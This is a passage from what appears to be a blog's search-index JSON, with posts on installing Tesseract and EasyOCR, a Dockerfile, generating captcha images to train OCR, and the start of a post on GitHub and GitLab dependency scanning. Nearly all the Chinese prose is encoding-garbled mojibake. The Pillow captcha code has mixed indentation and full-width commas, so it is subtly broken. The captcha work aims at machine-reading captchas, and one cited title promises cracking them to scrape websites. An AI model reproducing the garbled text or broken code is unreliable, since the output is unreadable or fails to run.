tessdocæ˜¯Googleå¼€æºçš„OCRæ¡†æ¶ã€‚\n0x02æ¶æ„å›¾ç•¥\n0x03æ ¸å¿ƒèƒ½åŠ›ç•¥\n0x04å¯¹æ¯”ç•¥\n0x05Quickstartç•¥### require\ninstallå®‰è£…tesseract-ocr\nsudo apt update &amp;&amp; sudo apt upgrade -y\nsudo apt-get install-y tesseract-ocr libtesseract-dev libleptioica-dev \nå‚è€ƒå®‰è£…tesseROCr\npip3 install tesseROCr pillow \nQ&amp;Atesseract 8upm.jpg outputbase -l eng --psm 3\nTesseract Open Source OCR Engine v4.0.0-beta.1 with Leptonica\nWarning. Invalid resolution 0 dpi. Using 70 instead.\nEstimating resolution as 131\nEmpty page!!\nEstimating resolution as 131\nEmpty page!!\n# tesseract 4.0.0-beta.1æ²¡æœ‰--dpiå‚æ•°\n tesseract -v\ntesseract 4.0.0-beta.1\n leptonica-1.75.3\n  libgif 5.1.4 : libjpeg 8d (libjpeg-turbo 1.5.2) : libpng 1.6.34 : libtiff 4.0.9 : zlib 1.2.11 : libwebp 0.6.1 : libopenjp2 2.3.0\n\n Found AVX2\n Found AVX\n Found SSE\n\nReferencesæå‡Tesseract-OCRè¾“å‡ºçš„è´¨é‡ - thomaszdxsn - åšå®¢å›­\n","slug":"Tesseract","date":"2022-10-21T08:25:00.000Z","categories_index":"äººå·¥æ™ºèƒ½","tags_index":"OCR,äººå·¥æ™ºèƒ½","author_index":"Moses"},{"id":"a20fa276d43ad34e01f5a964480c687b","title":"åˆè¯†EasyOCR","content":"EasyOCR0x01ç®€ä»‹æè¿°: EasyOCR æ˜¯ä¸€ä¸ªç”¨äºä»å›¾åƒä¸­æå–æ–‡æœ¬çš„ python æ¨¡å—, å®ƒæ˜¯ä¸€ç§é€šç”¨çš„ OCRï¼Œæ—¢å¯ä»¥è¯»å–è‡ªç„¶åœºæ™¯æ–‡æœ¬ï¼Œä¹Ÿå¯ä»¥è¯»å–æ–‡æ¡£ä¸­çš„å¯†é›†æ–‡æœ¬ã€‚ç›®å‰æ”¯æŒ 80 å¤šç§è¯­è¨€å’Œæ‰€æœ‰æµè¡Œçš„ä¹¦å†™è„šæœ¬ï¼ŒåŒ…æ‹¬ï¼šæ‹‰ä¸æ–‡ã€ä¸­æ–‡ã€é˜¿æ‹‰ä¼¯æ–‡ã€æ¢µæ–‡ã€è¥¿é‡Œå°”æ–‡ç­‰ã€‚é™¤å®˜ç½‘çš„ä½¿ç”¨demoå¤–ï¼Œè¿˜å¯ä»¥åœ¨ColabåŒæ—¶ä¹Ÿä½¿ç”¨Gradioé›†æˆåˆ°Huggingface Spaces\nğŸš€Linkï¼š\ndocs\ndemo\ngithub\nTravelcodeocr\nEasyOCR - a Hugging Face Space by tomofi\n\n0x02æ¶æ„å›¾\n0x03æ ¸å¿ƒèƒ½åŠ›è¯¥é¡¹ç›®åŸºäºæ¥è‡ªå‡ ç¯‡è®ºæ–‡å’Œå¼€æºå­˜å‚¨åº“çš„ç ”ç©¶å’Œä»£ç ã€‚\næ‰€æœ‰æ·±åº¦å­¦ä¹ æ‰§è¡Œéƒ½åŸºäºPytorchã€‚â¤ï¸\næ£€æµ‹æ‰§è¡Œä½¿ç”¨è¿™ä¸ªå®˜æ–¹å­˜å‚¨åº“åŠå…¶è®ºæ–‡ä¸­çš„CRAFTç®—æ³•ï¼ˆæ„Ÿè°¢@clovaaiçš„@YoungminBaekï¼‰ã€‚æˆ‘ä»¬è¿˜ä½¿ç”¨ä»–ä»¬çš„é¢„è®­ç»ƒæ¨¡å‹ã€‚åŸ¹è®­è„šæœ¬ç”±@gmuffinessæä¾›ã€‚\nè¯†åˆ«æ¨¡å‹æ˜¯CRNNï¼ˆè®ºæ–‡ï¼‰ã€‚å®ƒç”±3ä¸ªä¸»è¦ç»„ä»¶ç»„æˆï¼šç‰¹å¾æå–ï¼ˆæˆ‘ä»¬ç›®å‰æ­£åœ¨ä½¿ç”¨Resnetï¼‰å’ŒVGGã€åºåˆ—æ ‡è®°ï¼ˆLSTMï¼‰å’Œè§£ç ï¼ˆCTCï¼‰ã€‚è¯†åˆ«æ‰§è¡Œçš„è®­ç»ƒç®¡é“æ˜¯æ·±æ–‡æœ¬è¯†åˆ«åŸºå‡†æ¡†æ¶çš„ä¿®æ”¹ç‰ˆæœ¬ã€‚ï¼ˆæ¥è‡ª@clovaaiçš„æ„Ÿè°¢@ku21fanï¼‰è¿™ä¸ªå­˜å‚¨åº“æ˜¯ä¸€é¢—å€¼å¾—æ›´å¤šè®¤å¯çš„å®çŸ³ã€‚\nBeamæœç´¢ä»£ç åŸºäºæ­¤å­˜å‚¨åº“å’Œä»–çš„åšå®¢ã€‚ï¼ˆè°¢è°¢@githubharaldï¼‰\næ•°æ®åˆæˆåŸºäºTextRecognitionDataGeneratorã€‚ï¼ˆè°¢è°¢@Belvalï¼‰\nä»distill.pubè¿™é‡Œè¯»åˆ°å…³äºCTCçš„å¥½ä¹¦ã€‚\n0x04å¯¹æ¯”Tesseract\nEasyOCR\nTesseract\nå‚è€ƒ\næ–‡å­—è¯†åˆ«OCRå¼€æºæ¡†æ¶çš„å¯¹æ¯”â€“Tesseract vs EasyOCR - çŸ¥ä¹\nEasyOCR - a Hugging Face Space by tomofi\n\n\n\n0x05Quickstartrequire\nPython å»ºè®® 3.8 x64 ä»¥ä¸Šç‰ˆæœ¬ (åŸæœ¬æˆ‘çš„ç¯å¢ƒæ˜¯ Python 3.7 å®‰è£…æ—¶å„ç§ç¨€å¥‡å¤æ€ªçš„é”™è¯¯éƒ½å‡ºæ¥ï¼Œä¸å¾—å·²abandonæ”¾å¼ƒ)\neasyocr åŒ… -&gt; ä¾èµ– torch ã€torchvision ç¬¬ä¸‰æ–¹åŒ…\n\ninstall\næœ€æ–°ç¨³å®šç‰ˆ-from pip packagepip install easyocr -i https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F; --trusted-host mirrors.aliyun.com \næœ€æ–°å¼€å‘ç‰ˆpip install git+git:&#x2F;&#x2F;github.com&#x2F;jaidedai&#x2F;easyocr.git \n\ninstall -docker\nä¿®æ”¹å®˜æ–¹dockerfileæ–‡ä»¶EasyOCR&#x2F;Dockerfile at master Â· JaidedAI&#x2F;EasyOCR Â· GitHubï¼Œè€ƒè™‘åˆ°å›½å†…ç½‘ç»œé—®é¢˜ï¼Œä¿®æ”¹å‚è€ƒ[[2022-10-20_å‘¨å››#åˆ¶ä½œé•œåƒæ–‡ä»¶çš„ç½‘ç»œé—®é¢˜]]ä¹Ÿå¯ä»¥è€ƒè™‘å¢åŠ â€™expose&#x3D;xxâ€™è¿›è¡Œç«¯å£æ˜ å°„ï¼Œæˆ–è€…å¢åŠ tesseractéœ€è¦çš„äºŒè¿›åˆ¶æŠ¥# pytorch OS is Ubuntu 18.04\nFROM pytorch&#x2F;pytorch\nLABEL DESC&#x3D;&quot;EasyOCR Enviroment Build with Containerd Images&quot;\nARG service_home&#x3D;&quot;&#x2F;home&#x2F;EasyOCR&quot;\n\n# Enviroment &amp;&amp; Software\nRUN sed -i -e &quot;s#archive.ubuntu.com#mirrors.aliyun.com#g&quot; -e &quot;s#security.ubuntu.com#mirrors.aliyun.com#g&quot; &#x2F;etc&#x2F;apt&#x2F;sources.list  &amp;&amp; \\\n    apt-get update -y &amp;&amp; \\\n    apt-get install -y \\\n    libglib2.0-0 \\\n    libsm6 \\\n    libxext6 \\\n    libxrender-dev \\\n    libgl1-mesa-dev \\\n    git \\\n    vim \\\n    # cleanup\n    &amp;&amp; apt-get autoremove -y \\\n    &amp;&amp; apt-get clean -y \\\n    &amp;&amp; rm -rf &#x2F;var&#x2F;lib&#x2F;apt&#x2F;lists\n\n# COPY EasyOCR is Github(https:&#x2F;&#x2F;github.com&#x2F;JaidedAI&#x2F;EasyOCR.git)\nCOPY .&#x2F;EasyOCR &quot;$service_home&quot;\n\n# Build\nRUN cd &quot;$service_home&quot; \\\n  &amp;&amp; pip config set global.index-url https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F; \\\n  &amp;&amp; python setup.py build_ext --inplace -j 4 \\\n  &amp;&amp; python -m pip install -e . \nåˆ¶ä½œé•œåƒæ–‡ä»¶docker build -f dockerfile -tag eastocr:v1\nå¯åŠ¨å®¹å™¨ï¼šç”±äºå½“æ—¶ä½¿ç”¨docker build .â€˜ æ„å»ºçš„é•œåƒæ–‡ä»¶ï¼Œéœ€è¦æ‰“ä¸Štagdocker tag f1caac5c8abd easyocr:v1&#96; æŒ‚åœ¨æ–‡ä»¶è·¯å¾„å¯åŠ¨å®¹å™¨# ä¹‹å‰æŒ‚åœ¨çš„ç›®å½•æœ‰é—®é¢˜ï¼Œå¡«å†™äº†ä¸€ä¸ªä¸å­˜åœ¨æ–‡ä»¶è·¯å¾„\ndocker run --name easyocr -v &#x2F;Users&#x2F;xfxj01&#x2F;Downloads&#x2F;image-EasyOCR -tid easyocr:v1  &#x2F;bin&#x2F;bash\n# [docker-ä¿®æ”¹å®¹å™¨çš„æŒ‚è½½ç›®å½•ä¸‰ç§æ–¹å¼](https:&#x2F;&#x2F;blog.csdn.net&#x2F;zedelei&#x2F;article&#x2F;details&#x2F;90208183)å…¶ä¸­ç¬¬ä¸€ç§å¯¹Macä¸å¤ªå‹å¥½ï¼Œä¸»è¦åŸå› å¦‚ä¸‹\n[dockerè§£å†³Mac OSæŒ‚è½½åæ‰¾ä¸åˆ°var&#x2F;lib&#x2F;docker... - çŸ¥ä¹](https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;397425187ï¼‰\nè¿›å…¥å®¹å™¨docker exec -it 74a4ee31ea152da85d4288ee4d6a1d8688f071445a25fc26896ddd58a900c3cb /bin/sh\n\n0x06EasyOCRä½¿ç”¨è¯´æ˜\næµ‹è¯•ç”¨ä¾‹import easyocr\nreader &#x3D; easyocr.Reader([&#39;ch_sim&#39;,&#39;en&#39;]) # this needs to run only once to load the model into memory\nresult &#x3D; reader.readtext(&#39;chinese.jpg&#39;)\næ³¨æ„\n\n\n\n\n\n\n\n\n[&#39;ch_sim&#39;,&#39;en&#39;]æ˜¯æ‚¨æƒ³è¦é˜…è¯»çš„è¯­è¨€åˆ—è¡¨ã€‚æ‚¨å¯ä»¥åŒæ—¶é€šè¿‡å‡ ç§è¯­è¨€ï¼Œä½†å¹¶éæ‰€æœ‰è¯­è¨€éƒ½å¯ä»¥ä¸€èµ·ä½¿ç”¨ã€‚è‹±è¯­ä¸æ¯ç§è¯­è¨€å…¼å®¹ï¼Œå…±äº«å…±åŒå­—ç¬¦çš„è¯­è¨€é€šå¸¸ç›¸äº’å…¼å®¹ã€‚è¡Œreader = easyocr.Reader([&#39;ch_sim&#39;,&#39;en&#39;])ç”¨äºå°†æ¨¡å‹åŠ è½½åˆ°å†…å­˜ä¸­ã€‚è¿™éœ€è¦ä¸€äº›æ—¶é—´ï¼Œä½†åªéœ€è¦è¿è¡Œä¸€æ¬¡ã€‚\n\nå¯ä»¥è®¾ç½®detail=0ä»¥è·å¾—æ›´ç®€å•çš„è¾“å‡ºã€‚\n\n\n\nä½¿ç”¨å‘½ä»¤è¡Œè¿è¡Œ\neasyocr -l  en  -f 1.jpeg --detail&#x3D;0\n2. å¤±è´¥æ•ˆæœå¾ˆå·®ï¼Œå°è¯•å¯¹æµ‹è¯•å›¾ç‰‡è¿›è¡Œè½¬ç°åº¦å¤„ç†ï¼š åˆ©ç”¨Imageå¯¹è±¡çš„convert()æ–¹æ³•å‚æ•°ä¼ å…¥Lï¼Œå³å¯å°†å›¾ç‰‡è½¬æˆä¸ºç°åº¦å›¾åƒï¼š3. æ•ˆæœæ²¡å·®åˆ«ï¼Œå°è¯•äºŒå€¼åŒ–å¤„ç†ï¼ŒäºŒå€¼åŒ–æ˜¯æŒ‡å°†å›¾åƒä¸Šçš„åƒç´ ç‚¹çš„ç°åº¦å€¼è®¾ç½®ä¸º0æˆ–255ï¼Œä¹Ÿå°±æ˜¯å°†æ•´ä¸ªå›¾ç‰‡å‘ˆç°å‡ºæ˜æ˜¾çš„åªæœ‰é»‘å’Œç™¾çš„è§†è§‰æ•ˆæœ \nfrom PIL import Image\n\nimage &#x3D; Image.open(&quot;&#x2F;home&#x2F;EasyOCR&#x2F;examples&#x2F;1.jpeg&quot;)\nimage &#x3D; image.convert(&quot;L&quot;)\nthreshold &#x3D; 150\ntable &#x3D; []\nfor i in range(256):\n    if i &lt; threshold:\n        table.append(0)\n    else:\n        table.append(1)\n\nimage &#x3D; image.point(table,&quot;1&quot;)\nimage.save(&quot;&#x2F;home&#x2F;EasyOCR&#x2F;examples&#x2F;1-3.jpeg&quot;)\n4. æœ€ç»ˆè¿˜æ˜¯ä¸è¡Œï¼Œä½†å°±æµ‹è¯•å›¾ç‰‡æ¥è¯´ç»è¿‡ç®€å•å¤„ç†è¯†åˆ«ç‡è¿˜æ˜¯åœç•™åœ¨75%\nå›¾å½¢éªŒè¯ç 1. é€šè¿‡captchaåº“ç”Ÿæˆå›¾å½¢éªŒè¯ç # å®‰è£…æ¸…åçš„captchaåº“\npip install captcha -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple\nåˆ©ç”¨captchaåº“ç”Ÿæˆå›¾ç‰‡éªŒè¯ç çš„ä»£ç ï¼š\nfrom captcha.image import ImageCaptcha\nimport random,string\n\nchr_all &#x3D; string.ascii_letters + string.digits\nchr_4 &#x3D; &#39;&#39;.join(random.sample(chr_all, 4))\nimage &#x3D; ImageCaptcha().generate_image(chr_4)\nimage.save(&#39;.&#x2F;%s.jpg&#39; % chr_4)\nå°†éšæœºç”Ÿæˆçš„4ä¸ªå­—ç¬¦ç»„åˆä¼ å…¥ ImageCaptcha ç±»ä¸‹çš„ generate_image æ–¹æ³•ä¸­ï¼Œç„¶åä»–å°±ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªå›¾ç‰‡éªŒè¯ç ï¼Œå½¢å¼å¦‚ä¸‹ï¼š\n2. gvcodeåº“pip install graphic-verification-code -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple\nç”Ÿæˆä»£ç \nimport gvcode\ns,v &#x3D; gvcode.generate()\ns.save(&#39;.&#x2F;%s.jpg&#39; % v)\n3.  Pillowåº“Pillowæ˜¯ä¸€ä¸ªéå¸¸å¼ºå¤§çš„å›¾ç‰‡å¤„ç†æ¨¡å—ï¼Œå…¶ä¸­Imageæ˜¯Pillowä¸­æœ€ä¸ºé‡è¦çš„ç±»ï¼Œå®ç°äº†Pillowä¸­å¤§éƒ¨åˆ†çš„åŠŸèƒ½ï¼Œè¿™ä¸ªç±»çš„ä¸»è¦ç”¨æ¥è¡¨ç¤ºå›¾ç‰‡å¯¹è±¡ã€‚ç”Ÿæˆå›¾ç‰‡éªŒè¯ç éœ€è¦ä¸‹é¢è¿™å››ä¸ªç±»ï¼š\n\n1ã€Imageï¼šå«æœ‰å›¾ç‰‡å¯¹è±¡ä¸»ä½“ä¸Šçš„ä¸€äº›åº”ç”¨\n2ã€ImageDrawï¼šç”»ç¬”ï¼Œç”¨æ¥å‘å›¾ç‰‡ä¸Šæ·»åŠ éªŒè¯ç \n3ã€ImageFontï¼šè®¾ç½®éªŒè¯ç çš„å­—ä½“å½¢å¼\n4ã€ImageFilterï¼šå¯¹å›¾ç‰‡éªŒè¯ç è¿›è¡Œæ¨¡ç³Šå¤„ç†éªŒè¯ç å­—ä½“ä¸‹è½½import random\nfrom PIL import Image, ImageDraw, ImageFont, ImageFilter\n\n#  ç”ŸæˆéªŒè¯ç å‡½æ•°\ndef check_code(width&#x3D;120, height&#x3D;30, char_length&#x3D;5, font_file&#x3D;&#39;kumo.ttf&#39;, font_size&#x3D;28):\n    code &#x3D; []\n    img &#x3D; Image.new(mode&#x3D;&#39;RGB&#39;, size&#x3D;(width, height), color&#x3D;(255, 255, 255))\n    draw &#x3D; ImageDraw.Draw(img, mode&#x3D;&#39;RGB&#39;)\n \n    def rndChar():\n        &quot;&quot;&quot;\n        ç”Ÿæˆéšæœºå­—æ¯   \n        :return:\n        &quot;&quot;&quot;\n        return chr(random.randint(65, 90))\n \n    def rndColor():\n        &quot;&quot;&quot;\n        ç”Ÿæˆéšæœºé¢œè‰²\n        :return:\n        &quot;&quot;&quot;\n        return (random.randint(0, 255), random.randint(10, 255), random.randint(64, 255))\n \n    # å†™æ–‡å­—\n\tfont &#x3D; ImageFont.truetype(font_file, font_size)\n\tfor i in range(char_length):\n\t   char &#x3D; rndChar()\n\t   code.append(char)\n\t   h &#x3D; random.randint(0, 4)\n\t   draw.text([i * width &#x2F; char_length, h], char, font&#x3D;font, fill&#x3D;rndColor())\n \n    # å†™å¹²æ‰°ç‚¹\n   point_chance &#x3D; random.randint(0, 200)\n   chance &#x3D; min(200, max(0, point_chance)) # å¤§å°é™åˆ¶åœ¨[0, 100]\n   for w in range(0ï¼Œ widthï¼Œ 10):\n       for h in range(0ï¼Œ heightï¼Œ 10):\n           tmp &#x3D; random.randint(0, 50)\n           if tmp &gt; 200 - chance:\n               draw.point((w, h), fill&#x3D;(0, 0, 0))\n    # å†™å¹²æ‰°åœ†åœˆ\n    for i in range(40):\n        draw.point([random.randint(0, width), random.randint(0, height)], fill&#x3D;rndColor())\n        x &#x3D; random.randint(0, width)\n        y &#x3D; random.randint(0, height)\n        draw.arc((x, y, x + 4, y + 4), 0, 90, fill&#x3D;rndColor())\n \n    # ç”»å¹²æ‰°çº¿\n   line_num &#x3D; random.randint(0, 3)  # å¹²æ‰°çº¿æ¡æ•°\n   for i in range(line_num):\n       # èµ·å§‹ç‚¹\n       begin &#x3D; (random.randint(0, width), random.randint(0, height))\n       # ç»“æŸç‚¹\n       end &#x3D; (random.randint(0, width), random.randint(0, height))\n       draw.line([begin, end], fill&#x3D;rndColor())\n\t# æ·»åŠ æ¨¡ç³Šæ•ˆæœ\n    img &#x3D; img.filter(ImageFilter.EDGE_ENHANCE_MORE)\n    return img,&#39;&#39;.join(code)\n \n \nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    #  å†™å…¥æ–‡ä»¶\n    img,code &#x3D; check_code()\n    with open(&#39;code.png&#39;,&#39;wb&#39;) as f:\n        img.save(f,format&#x3D;&#39;png&#39;)\n\näº’è”ç½‘APIæ¥å£\nç©ºå¿ƒå­—ä½“https://login.sina.com.cn/cgi/pin.php?r=9967937&s=0&p=gz-d0dc363f6a4523cbd602a5a10f00c59b4784\nå­—æ¯https://www.xx/application/api/feedback/verificationcode?key=login&1666333612662\næ•°å­—partners.xx&#x2F;ImageCode.aspx?type&#x3D;bottom&amp;timestamp&#x3D;1666333641761\n\n0x07todoç”Ÿæˆæ ·æœ¬æ•°æ®ä½¿ç”¨captchaæ‰¹é‡ç”ŸæˆéšæœºéªŒè¯ç å›¾ç‰‡\nimport os\nflag &#x3D;1\ncount &#x3D;0\nwhile flag:\n    count +&#x3D;1\n    print(count)\n    if count &gt; 10000:\n        flag &#x3D; 0\n    depth &#x3D; &#39;python3 &#x2F;home&#x2F;EasyOCR&#x2F;examples&#x2F;captcha&#x2F;captcha2.py&#39;\n    os.system(depth)\n# å°†ç”ŸæˆéªŒè¯ç æ‹·è´åˆ°æ–‡ä»¶å¤¹\nfind -name &quot;*.jpg&quot; | xargs -i mv &#123;&#125; &#x2F;tmp&#x2F;simple\n# åˆ é™¤\nrm -rf *.jpg\nè‡ªå®šä¹‰è¯†åˆ«æ¨¡å‹è‡ªå®šä¹‰è¯†åˆ«æ¨¡å‹\n# modelå’Œuser_networkè·¯å¾„\n&#x2F;root&#x2F;.EasyOCR\nCraftè®­ç»ƒEasyOCR&#x2F;README.md at master Â· JaidedAI&#x2F;EasyOCR Â· GitHub\nReferencesæˆ‘åœ¨Bç«™å­¦ä¹ å›¾åƒå¤„ç†ä¹‹ä½¿ç”¨EasyOCRåº“å¯¹è¡Œç¨‹ç å›¾ç‰‡è¿›è¡Œæ‰¹é‡OCRæ–‡å­—è¯†åˆ« - å“”å“©å“”å“©Pythonç ´è§£å›¾å½¢éªŒè¯ç ï¼Œå­¦ä¼šå³å¯çˆ¬å–å¤§éƒ¨åˆ†ç½‘ç«™ï¼ - å“”å“©å“”å“©Pythonç¬¬ä¸‰æ–¹åº“å·§ç”¨ï¼Œåˆ¶ä½œå›¾ç‰‡éªŒè¯ç åªéœ€ä¸‰è¡Œä»£ç  - çŸ¥ä¹ä½¿ç”¨pillowç”Ÿæˆå›¾å½¢éªŒè¯ç _pyersçš„åšå®¢-CSDNåšå®¢_pillow éªŒè¯ç ä½¿ç”¨Tesseractåšæ–‡å­—è¯†åˆ«ï¼ˆOCRï¼‰ - çŸ¥ä¹å¯¹æ¯”äº†æœ€å¸¸è§çš„å‡ å®¶å¼€æºOCRæ¡†æ¶ï¼Œæˆ‘å‘ç°äº†æœ€å¥½çš„å¼€æºæ¨¡å‹ - çŸ¥ä¹æ–‡å­—è¯†åˆ«OCRå¼€æºæ¡†æ¶çš„å¯¹æ¯”â€“Tesseract vs EasyOCR - çŸ¥ä¹\n","slug":"åˆè¯†EasyOCR","date":"2022-10-20T09:53:00.000Z","categories_index":"äººå·¥æ™ºèƒ½","tags_index":"OCR,æ·±åº¦å­¦ä¹ ,ç¥ç»ç½‘ç»œ","author_index":"Moses"},{"id":"139cfafc4597f90b4e444ece2c228d13","title":"ä»£ç æ‰˜ç®¡å¹³å°çš„è½¯ä»¶ä¾›åº”é“¾å®‰å…¨èƒ½åŠ›ä»‹ç»","content":"githubçš„è½¯ä»¶ä¾›åº”é“¾å®‰å…¨èƒ½åŠ›GitHubå…³äºDependabotå®‰å…¨æ›´æ–°Dependabotå®‰å…¨æ›´æ–°ä½¿æ‚¨æ›´å®¹æ˜“ä¿®å¤å­˜å‚¨åº“ä¸­çš„æ˜“å—æ”»å‡»çš„ä¾èµ–é¡¹ã€‚å¦‚æœæ‚¨å¯ç”¨æ­¤åŠŸèƒ½ï¼Œå½“åœ¨å­˜å‚¨åº“çš„ä¾èµ–å…³ç³»å›¾ä¸­ä¸ºæ˜“å—æ”»å‡»çš„ä¾èµ–é¡¹å¼•å‘ä¾èµ–é¡¹æ—¶ï¼ŒDependabotä¼šè‡ªåŠ¨å°è¯•ä¿®å¤å®ƒã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…â€œå…³äºä¾èµ–æœºå™¨äººè­¦æŠ¥â€å’Œâ€œé…ç½®ä¾èµ–æœºå™¨äººå®‰å…¨æ›´æ–°â€ã€‚GitHubå¯èƒ½ä¼šå‘å—æœ€è¿‘å‘å¸ƒçš„GitHubå®‰å…¨å…¬å‘ŠæŠ«éœ²çš„æ¼æ´å½±å“çš„å­˜å‚¨åº“å‘é€Dependabotè­¦æŠ¥ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…â€œåœ¨GitHubå’¨è¯¢æ•°æ®åº“ä¸­æµè§ˆå®‰å…¨å»ºè®®â€ã€‚\n\n\n\n\n\n\n\n\n\næ³¨æ„ï¼šDependabotå®‰å…¨æ›´æ–°åŠŸèƒ½é€‚ç”¨äºæ‚¨å¯ç”¨ä¾èµ–å…³ç³»å›¾å’ŒDependabotè­¦æŠ¥çš„å­˜å‚¨åº“ã€‚æ‚¨å°†çœ‹åˆ°å®Œæ•´ä¾èµ–å…³ç³»å›¾ä¸­è¯†åˆ«çš„æ¯ä¸ªè„†å¼±ä¾èµ–é¡¹çš„ä¾èµ–é¡¹è­¦æŠ¥ã€‚ä½†æ˜¯ï¼Œå®‰å…¨æ›´æ–°ä»…é’ˆå¯¹æ¸…å•æˆ–é”å®šæ–‡ä»¶ä¸­æŒ‡å®šçš„ä¾èµ–é¡¹è§¦å‘ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…â€œå…³äºä¾èµ–å…³ç³»å›¾â€ã€‚å¯¹äºnpmï¼ŒDependabotå°†å¼•å‘ä¸€ä¸ªæ‹‰å–è¯·æ±‚ï¼Œå°†æ˜¾å¼å®šä¹‰çš„ä¾èµ–é¡¹æ›´æ–°åˆ°å®‰å…¨ç‰ˆæœ¬ï¼Œå³ä½¿è¿™æ„å‘³ç€æ›´æ–°çˆ¶ä¾èµ–é¡¹æˆ–ä¾èµ–é¡¹ã€‚å¯¹äºå…¶ä»–ç”Ÿæ€ç³»ç»Ÿï¼Œå¦‚æœä¾èµ–é¡¹è¿˜éœ€è¦æ›´æ–°çˆ¶ä¾èµ–é¡¹ï¼Œåˆ™æ— æ³•æ›´æ–°é—´æ¥æˆ–ä¼ é€’ä¾èµ–é¡¹ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…â€œDependabotå°è¯•åœ¨æ²¡æœ‰è­¦æŠ¥çš„æƒ…å†µä¸‹æ›´æ–°ä¾èµ–é¡¹â€ã€‚\né…ç½® Dependabot å®‰å…¨æ›´æ–°æ“ä½œè¯¦è§Configuring Dependabot security updates - GitHub Docs\nä½¿ç”¨ä¾èµ–é¡¹æäº¤APIä¾èµ–é¡¹æäº¤APIå…è®¸æ‚¨æäº¤é¡¹ç›®çš„ä¾èµ–é¡¹ã€‚è¿™ä½¿æ‚¨èƒ½å¤Ÿå°†ä¾èµ–é¡¹ï¼ˆä¾‹å¦‚åœ¨ç¼–è¯‘æˆ–æ„å»ºè½¯ä»¶æ—¶è§£å†³çš„ä¾èµ–é¡¹ï¼‰æ·»åŠ åˆ°GitHubçš„ä¾èµ–å…³ç³»å›¾åŠŸèƒ½ä¸­ï¼Œä»è€Œæ›´å®Œæ•´åœ°äº†è§£é¡¹ç›®çš„æ‰€æœ‰ä¾èµ–é¡¹ã€‚\nä¾èµ–é¡¹å›¾æ˜¾ç¤ºæ‚¨ä½¿ç”¨APIæäº¤çš„ä»»ä½•ä¾èµ–é¡¹ï¼Œä»¥åŠä»å­˜å‚¨åº“ä¸­çš„æ¸…å•æˆ–é”å®šæ–‡ä»¶ä¸­è¯†åˆ«çš„ä»»ä½•ä¾èµ–é¡¹ï¼ˆä¾‹å¦‚ï¼ŒJavaScripté¡¹ç›®ä¸­çš„apackagepackage-lock.jsonæ–‡ä»¶ï¼‰ã€‚æœ‰å…³æŸ¥çœ‹ä¾èµ–å…³ç³»å›¾çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…â€œæ¢ç´¢å­˜å‚¨åº“çš„ä¾èµ–é¡¹â€ã€‚ä¾èµ–æäº¤APIDependency submission - GitHub Docsæ²¡æœ‰å…·ä½“æµ‹è¯•ï¼Œä¸çŸ¥é“èƒ½ä¸èƒ½æ‰«æäºŒè¿›åˆ¶æ–‡ä»¶åŒ…ã€‚ å¯¹æ¯”[[2022-09-22_å‘¨å››#è…¾è®¯äº‘çš„äºŒè¿›åˆ¶åˆ†æå·¥å…·åŠå…¶ä»–å®‰å…¨èƒ½åŠ›]]\ngitlabä¾èµ–æ‰«æDependency-scanningä¾èµ–æ‰«æé€šå¸¸è¢«è®¤ä¸ºæ˜¯è½¯ä»¶ç»„æˆåˆ†æï¼ˆSCAï¼‰çš„ä¸€éƒ¨åˆ†ã€‚SCAå¯ä»¥åŒ…å«æ£€æŸ¥ä»£ç ä½¿ç”¨çš„é¡¹ç›®çš„å„ä¸ªæ–¹é¢ã€‚è¿™äº›é¡¹ç›®é€šå¸¸åŒ…æ‹¬åº”ç”¨ç¨‹åºå’Œç³»ç»Ÿä¾èµ–é¡¹ï¼Œè¿™äº›ä¾èµ–é¡¹å‡ ä¹æ€»æ˜¯ä»å¤–éƒ¨æ¥æºå¯¼å…¥ï¼Œè€Œä¸æ˜¯ä»æ‚¨è‡ªå·±ç¼–å†™çš„é¡¹ç›®ä¸­è·å–ã€‚\nå¦‚æœæ‚¨æ­£åœ¨ä½¿ç”¨GitLab CI&#x2F;CDï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä¾èµ–é¡¹æ‰«ææ¥åˆ†ææ‚¨çš„ä¾èµ–é¡¹æ˜¯å¦å­˜åœ¨å·²çŸ¥æ¼æ´ã€‚GitLabæ‰«ææ‰€æœ‰ä¾èµ–é¡¹ï¼ŒåŒ…æ‹¬ä¼ é€’ä¾èµ–é¡¹ï¼ˆä¹Ÿç§°ä¸ºåµŒå¥—ä¾èµ–é¡¹ï¼‰ã€‚æ‚¨å¯ä»¥é€šè¿‡ä»¥ä¸‹ä»»ä¸€æ–¹å¼åˆ©ç”¨ä¾èµ–é¡¹æ‰«æï¼š\n\nå°†ä¾èµ–æ‰«ææ¨¡æ¿åŒ…å«åœ¨æ‚¨ç°æœ‰çš„.gitlab-ci.ymlæ–‡ä»¶ä¸­ã€‚\néšå¼ä½¿ç”¨Auto DevOpsæä¾›çš„è‡ªåŠ¨ä¾èµ–æ‰«æã€‚\n\nGitLabæ£€æŸ¥ä¾èµ–é¡¹æ‰«ææŠ¥å‘Šï¼Œæ¯”è¾ƒæºåˆ†æ”¯å’Œç›®æ 